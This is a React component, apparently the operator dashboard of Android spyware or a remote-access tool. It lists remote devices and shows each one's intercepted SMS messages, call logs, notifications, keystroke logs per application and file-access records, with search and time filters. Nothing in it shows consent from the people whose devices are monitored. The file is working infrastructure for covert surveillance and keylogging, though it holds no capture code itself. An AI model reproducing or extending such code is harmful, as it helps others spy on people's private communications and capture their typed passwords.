import React, { useState, useEffect } from 'react';
import { 
  Box, 
  Typography, 
  Paper, 
  Divider, 
  CircularProgress,
  FormControl,
  InputLabel,
  Select,
  MenuItem,
  Grid,
  Table,
  TableBody,
  TableCell,
  TableContainer,
  TableHead,
  TableRow,
  Tabs,
  Tab,
  IconButton,
  Tooltip,
  TextField
} from '@mui/material';
import { 
  ChatBubble as SmsIcon, 
  Phone as CallIcon, 
  Notifications as NotificationIcon,
  Keyboard as KeylogIcon,
  Folder as FileIcon,
  Refresh as RefreshIcon,
  DateRange as DateRangeIcon
} from '@mui/icons-material';
import { 
  getDeviceLogs, 
  getSmsLogs, 
  getCallLogs, 
  getNotificationLogs, 
  getKeyLogs, 
  getFileLogs 
} from '../services/api';

// Log type constants
const LOG_TYPES = {
  SMS: 'sms',
  CALL: 'call',
  NOTIFICATION: 'notification',
  KEYLOG: 'keylog',
  FILE: 'file',
};

function LogViewer({ devices, selectedDevice, onSelectDevice }) {
  const [activeTab, setActiveTab] = useState(LOG_TYPES.SMS);
  const [logs, setLogs] = useState([]);
  const [loading, setLoading] = useState(false);
  const [timeRange, setTimeRange] = useState('24h');
  const [searchTerm, setSearchTerm] = useState('');
  
  useEffect(() => {
    if (selectedDevice) {
      fetchLogs(selectedDevice.id, activeTab, timeRange);
    }
  }, [selectedDevice, activeTab, timeRange]);
  
  const fetchLogs = async (deviceId, logType, range) => {
    if (!deviceId) return;
    
    setLoading(true);
    try {
      let data = [];
      
      switch (logType) {
        case LOG_TYPES.SMS:
          data = await getSmsLogs(deviceId, range);
          break;
        case LOG_TYPES.CALL:
          data = await getCallLogs(deviceId, range);
          break;
        case LOG_TYPES.NOTIFICATION:
          data = await getNotificationLogs(deviceId, range);
          break;
        case LOG_TYPES.KEYLOG:
          data = await getKeyLogs(deviceId, range);
          break;
        case LOG_TYPES.FILE:
          data = await getFileLogs(deviceId, range);
          break;
        default:
          data = await getDeviceLogs(deviceId, logType, range);
      }
      
      setLogs(data);
    } catch (error) {
      console.error(`Error fetching ${logType} logs:`, error);
      setLogs([]);
    } finally {
      setLoading(false);
    }
  };
  
  const handleRefresh = () => {
    if (selectedDevice) {
      fetchLogs(selectedDevice.id, activeTab, timeRange);
    }
  };
  
  const handleTabChange = (_, newValue) => {
    setActiveTab(newValue);
  };
  
  const handleTimeRangeChange = (event) => {
    setTimeRange(event.target.value);
  };
  
  const handleSearchChange = (event) => {
    setSearchTerm(event.target.value);
  };
  
  // Format timestamp
  const formatDateTime = (timestamp) => {
    if (!timestamp) return 'N/A';
    return new Date(timestamp).toLocaleString();
  };
  
  // Filter logs based on search term
  const filteredLogs = logs.filter(log => {
    if (!searchTerm) return true;
    
    const searchTermLower = searchTerm.toLowerCase();
    
    switch (activeTab) {
      case LOG_TYPES.SMS:
        return (
          (log.phoneNumber && log.phoneNumber.includes(searchTermLower)) ||
          (log.contactName && log.contactName.toLowerCase().includes(searchTermLower)) ||
          (log.message && log.message.toLowerCase().includes(searchTermLower))
        );
      case LOG_TYPES.CALL:
        return (
          (log.phoneNumber && log.phoneNumber.includes(searchTermLower)) ||
          (log.contactName && log.contactName.toLowerCase().includes(searchTermLower))
        );
      case LOG_TYPES.NOTIFICATION:
        return (
          (log.appName && log.appName.toLowerCase().includes(searchTermLower)) ||
          (log.title && log.title.toLowerCase().includes(searchTermLower)) ||
          (log.text && log.text.toLowerCase().includes(searchTermLower))
        );
      case LOG_TYPES.KEYLOG:
        return (
          (log.application && log.application.toLowerCase().includes(searchTermLower)) ||
          (log.text && log.text.toLowerCase().includes(searchTermLower))
        );
      case LOG_TYPES.FILE:
        return (
          (log.path && log.path.toLowerCase().includes(searchTermLower)) ||
          (log.operation && log.operation.toLowerCase().includes(searchTermLower))
        );
      default:
        return false;
    }
  });
  
  // Render table based on active tab
  const renderLogsTable = () => {
    if (loading) {
      return (
        <Box display="flex" justifyContent="center" p={4}>
          <CircularProgress />
        </Box>
      );
    }
    
    if (!selectedDevice) {
      return (
        <Box p={2} textAlign="center">
          <Typography variant="body1" color="textSecondary">
            Please select a device to view logs.
          </Typography>
        </Box>
      );
    }
    
    if (filteredLogs.length === 0) {
      return (
        <Box p={2} textAlign="center">
          <Typography variant="body1" color="textSecondary">
            No logs found for the selected device and time range.
          </Typography>
        </Box>
      );
    }
    
    switch (activeTab) {
      case LOG_TYPES.SMS:
        return (
          <TableContainer>
            <Table size="small">
              <TableHead>
                <TableRow>
                  <TableCell>Time</TableCell>
                  <TableCell>Type</TableCell>
                  <TableCell>Contact</TableCell>
                  <TableCell>Message</TableCell>
                </TableRow>
              </TableHead>
              <TableBody>
                {filteredLogs.map((log, index) => (
                  <TableRow key={index}>
                    <TableCell>{formatDateTime(log.timestamp)}</TableCell>
                    <TableCell>{log.type === 'sent' ? 'Outgoing' : 'Incoming'}</TableCell>
                    <TableCell>
                      {log.contactName || log.phoneNumber || 'Unknown'}
                    </TableCell>
                    <TableCell sx={{ maxWidth: '300px', whiteSpace: 'normal', wordBreak: 'break-word' }}>
                      {log.message}
                    </TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          </TableContainer>
        );
      
      case LOG_TYPES.CALL:
        return (
          <TableContainer>
            <Table size="small">
              <TableHead>
                <TableRow>
                  <TableCell>Time</TableCell>
                  <TableCell>Type</TableCell>
                  <TableCell>Contact</TableCell>
                  <TableCell>Duration</TableCell>
                  <TableCell>Status</TableCell>
                </TableRow>
              </TableHead>
              <TableBody>
                {filteredLogs.map((log, index) => (
                  <TableRow key={index}>
                    <TableCell>{formatDateTime(log.timestamp)}</TableCell>
                    <TableCell>
                      {log.type === 'outgoing' ? 'Outgoing' : log.type === 'incoming' ? 'Incoming' : 'Missed'}
                    </TableCell>
                    <TableCell>
                      {log.contactName || log.phoneNumber || 'Unknown'}
                    </TableCell>
                    <TableCell>
                      {log.duration ? `${Math.round(log.duration / 60)} min ${log.duration % 60} sec` : 'N/A'}
                    </TableCell>
                    <TableCell>{log.status || 'N/A'}</TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          </TableContainer>
        );
      
      case LOG_TYPES.NOTIFICATION:
        return (
          <TableContainer>
            <Table size="small">
              <TableHead>
                <TableRow>
                  <TableCell>Time</TableCell>
                  <TableCell>App</TableCell>
                  <TableCell>Title</TableCell>
                  <TableCell>Text</TableCell>
                </TableRow>
              </TableHead>
              <TableBody>
                {filteredLogs.map((log, index) => (
                  <TableRow key={index}>
                    <TableCell>{formatDateTime(log.timestamp)}</TableCell>
                    <TableCell>{log.appName || 'Unknown'}</TableCell>
                    <TableCell>{log.title || 'No Title'}</TableCell>
                    <TableCell sx={{ maxWidth: '300px', whiteSpace: 'normal', wordBreak: 'break-word' }}>
                      {log.text || 'No Content'}
                    </TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          </TableContainer>
        );
      
      case LOG_TYPES.KEYLOG:
        return (
          <TableContainer>
            <Table size="small">
              <TableHead>
                <TableRow>
                  <TableCell>Time</TableCell>
                  <TableCell>Application</TableCell>
                  <TableCell>Input Text</TableCell>
                </TableRow>
              </TableHead>
              <TableBody>
                {filteredLogs.map((log, index) => (
                  <TableRow key={index}>
                    <TableCell>{formatDateTime(log.timestamp)}</TableCell>
                    <TableCell>{log.application || 'Unknown'}</TableCell>
                    <TableCell sx={{ maxWidth: '400px', whiteSpace: 'normal', wordBreak: 'break-word' }}>
                      {log.text || 'N/A'}
                    </TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          </TableContainer>
        );
      
      case LOG_TYPES.FILE:
        return (
          <TableContainer>
            <Table size="small">
              <TableHead>
                <TableRow>
                  <TableCell>Time</TableCell>
                  <TableCell>Operation</TableCell>
                  <TableCell>Path</TableCell>
                  <TableCell>Size</TableCell>
                </TableRow>
              </TableHead>
              <TableBody>
                {filteredLogs.map((log, index) => (
                  <TableRow key={index}>
                    <TableCell>{formatDateTime(log.timestamp)}</TableCell>
                    <TableCell>{log.operation || 'N/A'}</TableCell>
                    <TableCell sx={{ maxWidth: '300px', whiteSpace: 'normal', wordBreak: 'break-word' }}>
                      {log.path || 'N/A'}
                    </TableCell>
                    <TableCell>
                      {log.size ? `${Math.round(log.size / 1024)} KB` : 'N/A'}
                    </TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          </TableContainer>
        );
      
      default:
        return null;
    }
  };
  
  return (
    <Box>
      <Paper sx={{ mb: 3 }}>
        <Box p={2} bgcolor="primary.main" color="white" display="flex" justifyContent="space-between" alignItems="center">
          <Typography variant="h6">
            Log Viewer
          </Typography>
          
          <Box display="flex" alignItems="center">
            <FormControl size="small" variant="outlined" sx={{ minWidth: 150, bgcolor: 'white', borderRadius: 1, mx: 1 }}>
              <InputLabel id="device-select-label">Device</InputLabel>
              <Select
                labelId="device-select-label"
                value={selectedDevice ? selectedDevice.id : ''}
                onChange={(e) => {
                  const device = devices.find(d => d.id === e.target.value);
                  if (device) onSelectDevice(device);
                }}
                label="Device"
              >
                {devices.map((device) => (
                  <MenuItem key={device.id} value={device.id}>
                    {device.model || 'Unknown'} - {device.id.substring(0, 8)}...
                  </MenuItem>
                ))}
              </Select>
            </FormControl>
            
            <FormControl size="small" variant="outlined" sx={{ minWidth: 120, bgcolor: 'white', borderRadius: 1 }}>
              <InputLabel id="time-range-label">Time Range</InputLabel>
              <Select
                labelId="time-range-label"
                value={timeRange}
                onChange={handleTimeRangeChange}
                label="Time Range"
              >
                <MenuItem value="24h">Last 24 Hours</MenuItem>
                <MenuItem value="7d">Last 7 Days</MenuItem>
                <MenuItem value="30d">Last 30 Days</MenuItem>
                <MenuItem value="all">All Time</MenuItem>
              </Select>
            </FormControl>
            
            <Tooltip title="Refresh">
              <IconButton color="inherit" onClick={handleRefresh} sx={{ ml: 1 }}>
                <RefreshIcon />
              </IconButton>
            </Tooltip>
          </Box>
        </Box>
        <Divider />
        
        <Box>
          <Tabs
            value={activeTab}
            onChange={handleTabChange}
            variant="scrollable"
            scrollButtons="auto"
            allowScrollButtonsMobile
          >
            <Tab 
              icon={<SmsIcon />} 
              label="SMS" 
              value={LOG_TYPES.SMS} 
              iconPosition="start" 
            />
            <Tab 
              icon={<CallIcon />} 
              label="Calls" 
              value={LOG_TYPES.CALL} 
              iconPosition="start" 
            />
            <Tab 
              icon={<NotificationIcon />} 
              label="Notifications" 
              value={LOG_TYPES.NOTIFICATION} 
              iconPosition="start" 
            />
            <Tab 
              icon={<KeylogIcon />} 
              label="Key Logs" 
              value={LOG_TYPES.KEYLOG} 
              iconPosition="start" 
            />
            <Tab 
              icon={<FileIcon />} 
              label="File Access" 
              value={LOG_TYPES.FILE} 
              iconPosition="start" 
            />
          </Tabs>
        </Box>
        
        <Box p={2}>
          <TextField
            fullWidth
            variant="outlined"
            size="small"
            label="Search Logs"
            value={searchTerm}
            onChange={handleSearchChange}
            sx={{ mb: 2 }}
            placeholder="Search by content, contact name, phone number, etc."
          />
          {renderLogsTable()}
        </Box>
      </Paper>
    </Box>
  );
}

export default LogViewer;
